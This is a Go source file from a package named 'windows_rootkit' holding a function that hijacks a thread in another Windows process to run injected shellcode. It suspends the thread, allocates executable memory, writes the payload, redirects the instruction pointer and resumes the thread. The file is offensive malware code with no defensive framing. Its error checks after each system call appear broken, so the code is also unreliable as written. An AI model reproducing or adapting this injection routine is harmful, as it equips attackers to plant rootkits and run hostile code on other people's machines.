package windows_rootkit

import (
	"syscall"
	"unsafe"
)

// Function to carry out thread execution hijacking on a process with Administrator privileges
func HijackThreadAdmin(targetProcessID uint32, targetThreadID uint32, targetAddress uintptr, Shellcode []byte) error {
	// Open the target process
	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessID)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(processHandle)

	// Suspend the target thread
	threadHandle, err := OpenThreadCustom(THREAD_SUSPEND_RESUME, false, targetThreadID)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(threadHandle)

	_, _, err = ProcSuspendThread.Call(uintptr(threadHandle))
	if err != nil {
		return err
	}

	// Get the context of the suspended thread
	var context Context
	context.ContextFlags = CONTEXT_FULL
	_, _, err = ProcGetThreadContext.Call(uintptr(threadHandle), uintptr(unsafe.Pointer(&context)))
	if err != nil {
		return err
	}

	// Allocate memory in the target process
	addr, _, err := VirtualAllocEx.Call(
		uintptr(processHandle),
		0,
		uintptr(len(Shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return err
	}

	// Write the shellcode to the allocated memory
	_, _, err = WriteProcessMemory.Call(
		uintptr(processHandle),
		addr,
		uintptr(unsafe.Pointer(&Shellcode[0])),
		uintptr(len(Shellcode)),
		0,
	)
	if err != nil {
		return err
	}

	// Modify the context to set the instruction pointer to the address of the shellcode
	context.Rip = uint64(addr)

	// Set the modified context
	_, _, err = ProcSetThreadContext.Call(uintptr(threadHandle), uintptr(unsafe.Pointer(&context)))
	if err != nil {
		return err
	}

	// Resume the target thread
	_, _, err = ProcResumeThread.Call(uintptr(threadHandle))
	if err != nil {
		return err
	}

	return nil
}
